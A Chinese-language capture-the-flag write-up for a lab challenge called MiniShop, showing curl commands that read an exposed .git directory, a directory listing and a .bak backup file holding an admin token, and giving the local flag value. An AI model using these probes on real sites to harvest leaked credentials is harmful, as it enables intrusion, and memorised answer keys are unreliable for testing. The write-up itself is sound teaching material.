# 20 · MiniShop 商城 — Writeup

## 思路

三个信息泄露点都值得检查，flag 在备份文件里：

1. `/.git/HEAD` 和 `/.git/config` 暴露版本控制目录，说明站点把 `.git` 留在了线上；
2. `/backup/` 返回目录列表；
3. `/backup/index.html.bak`（或 `/index.html.bak`）是编辑器备份文件，里面有管理员 token。

```bash
curl -s http://127.0.0.1:8127/.git/HEAD
curl -s http://127.0.0.1:8127/.git/config
curl -s http://127.0.0.1:8127/backup/
curl -s http://127.0.0.1:8127/backup/index.html.bak | grep -o 'flag{[^}]*}'
```

备份文件内容大致是：

```html
<h1>MiniShop v1.0</h1>
<p>TODO: 下线前记得删除这个备份文件</p>
<!-- db password: shop123456 -->
<!-- admin token: flag{...} -->
```

## 原理

`src/app/app.py` 用几个显式路由模拟真实站点常见的三类泄露：`.git` 目录、目录列表、`.bak` 备份文件。备份文件里的 `admin token` 由 `FLAG` 环境变量渲染。

## Flag

`flag{f23fa972baf0a41af89535f5ddbcf41a}`（本地复现 flag；平台实例的 flag 由 `FLAG` 环境变量注入）
